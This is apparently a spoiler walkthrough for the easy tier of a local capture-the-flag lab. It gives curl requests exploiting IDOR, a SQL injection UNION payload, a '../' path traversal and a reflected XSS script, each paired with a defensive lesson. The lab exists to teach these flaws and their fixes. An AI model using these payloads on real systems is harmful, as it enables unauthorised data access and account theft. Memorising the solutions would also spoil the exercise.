# Walkthroughs — easy tier (SPOILERS)

## idor — Read the admin's account

```bash
curl -s http://127.0.0.1:5000/api/account/3
```

The endpoint returns any account by id with no ownership check (broken
object-level authorization / IDOR). The admin is id 3; the flag is in
`secret_note`. Submit it:

```bash
python ctf.py submit idor '<flag from secret_note>'
```

**Lesson:** authorization must be enforced per object on the server. Hiding the
id in the UI is not a control.

## sqli — Leak the secrets table

```bash
curl -s "http://127.0.0.1:5000/api/search?username=' UNION SELECT flag, label FROM secrets-- -"
```

The query is built by string concatenation. The single quote closes the string;
`UNION SELECT` appends rows from the `secrets` table (two columns, matching the
original select). The flag comes back in the `username` field.

**Lesson:** use parameterised queries; never concatenate input into SQL.

## traversal — Escape the web root

```bash
curl -s "http://127.0.0.1:5000/download?file=../ctf_flag.txt"
```

The filename is joined to the base directory with no confinement, so `../`
climbs out to the parent where the flag file lives.

**Lesson:** resolve the final path and confirm it stays within the intended
directory; prefer mapping an id to a known filename over accepting raw paths.

## xss — Pop the admin bot

```bash
curl -s -D - "http://127.0.0.1:5000/greet?name=<script>x</script>" -o /dev/null
```

The name is reflected into HTML unescaped. A script payload makes the simulated
admin bot "execute" it and leak its cookie in the `X-Admin-Cookie` response
header — that value is the flag.

**Lesson:** encode output for its context; add a Content-Security-Policy as a
second layer.
